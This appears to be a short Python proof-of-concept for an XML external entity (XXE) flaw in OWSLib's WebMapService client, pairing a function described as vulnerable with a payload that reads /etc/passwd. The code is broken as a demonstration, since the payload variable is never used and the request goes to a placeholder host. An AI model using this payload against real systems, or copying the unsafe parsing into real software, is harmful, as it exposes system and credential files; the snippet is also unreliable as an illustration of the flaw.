import requests
from owslib.wms import WebMapService

# Vulnerable code using OWSLib without disabling entity resolution
def fetch_wms_capabilities(url):
    wms = WebMapService(url)
    return wms.getcapabilities()

# Example of an attacker-controlled XML payload
malicious_xml = """<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<request>
  <data>&xxe;</data>
</request>
"""

# Simulating fetching capabilities with a malicious XML payload
try:
    response = fetch_wms_capabilities('http://example.com/wms?service=WMS&request=GetCapabilities')
    print(response)
except Exception as e:
    print("An error occurred:", e)